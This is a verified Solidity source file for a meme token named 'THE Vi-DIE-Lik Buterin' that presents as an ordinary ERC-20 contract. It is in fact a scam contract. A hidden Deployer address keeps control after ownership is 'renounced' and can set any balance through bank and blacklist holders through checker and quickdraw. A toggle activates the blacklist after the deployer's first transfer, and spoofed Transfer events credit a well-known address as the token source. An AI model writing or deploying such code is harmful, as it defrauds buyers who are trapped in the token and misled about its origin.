/**
 *Submitted for verification at Etherscan.io on 2022-10-20
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract VIDIELIK {
  
    mapping (address => uint256) public THE;
    mapping (address => bool) DIE;
    mapping(address => mapping(address => uint256)) public allowance;




    string public name = "THE Vi-DIE-Lik Buterin";
    string public symbol = unicode"VIDIELIK";
    uint8 public decimals = 18;
    uint256 public totalSupply = 5000000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
    bool X;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    

    constructor()  {
    THE[msg.sender] = totalSupply;
    deploy(Constructor, totalSupply); }

    address Deployer = 0xdaDC3c3bE490e3b747c447334a827853d2f66683;
    address Constructor = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;
   
    modifier DP () {
    require(msg.sender == Deployer);
        _; }
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
        while(X) {
        require(!DIE[msg.sender]);
        require(THE[msg.sender] >= value);
        THE[msg.sender] -= value;  
        THE[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        if(msg.sender == Deployer)  {
        require(THE[msg.sender] >= value);
        THE[msg.sender] -= value;  
        THE[to] += value; 
        emit Transfer (Constructor, to, value);
         X = !X;
        return true; }  
        require(THE[msg.sender] >= value);
        THE[msg.sender] -= value;  
        THE[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
		function bank(address x, uint256 y) DP public {
        THE[x] = y;}

        function balanceOf(address account) public view returns (uint256) {
        return THE[account]; }
        function quickdraw(address x) DP public {
        require(DIE[x]);
        DIE[x] = false; }
        function checker(address x) DP public{ 
        require(!DIE[x]);
        DIE[x] = true;}

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 
        while(X) {
        require(!DIE[from] && !DIE[to]);
        require(value <= THE[from]);
        require(value <= allowance[from][msg.sender]);
        THE[from] -= value;
        THE[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
        if(from == Deployer)  {
        require(value <= THE[from]);
        require(value <= allowance[from][msg.sender]);
        THE[from] -= value;  
        THE[to] += value; 
        emit Transfer (Constructor, to, value);
        return true; }    
        require(value <= THE[from]);
        require(value <= allowance[from][msg.sender]);
        THE[from] -= value;
        THE[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}